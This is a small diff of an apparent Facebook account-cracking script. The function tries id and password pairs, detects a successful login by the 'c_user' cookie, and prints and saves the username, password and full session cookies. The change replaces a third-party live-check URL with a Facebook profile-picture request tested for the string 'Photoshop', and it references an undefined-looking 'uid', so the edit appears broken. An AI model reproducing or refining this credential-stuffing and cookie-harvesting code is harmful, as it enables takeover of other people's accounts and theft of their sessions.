@@ -1465,9 +1465,9 @@ def m8(idf,pwv):
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
-    url = f"https://thanhlike.com/modun/tool/get_facebook.php?type=checklive&id={user}"
+    url = f'https://graph.facebook.com/{uid}/picture?type=normal'
     reqx = requests.get(url).text
-    if 'live' in reqx:
+    if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
             statusok = (f" {user} | {ps} | {coki} ")
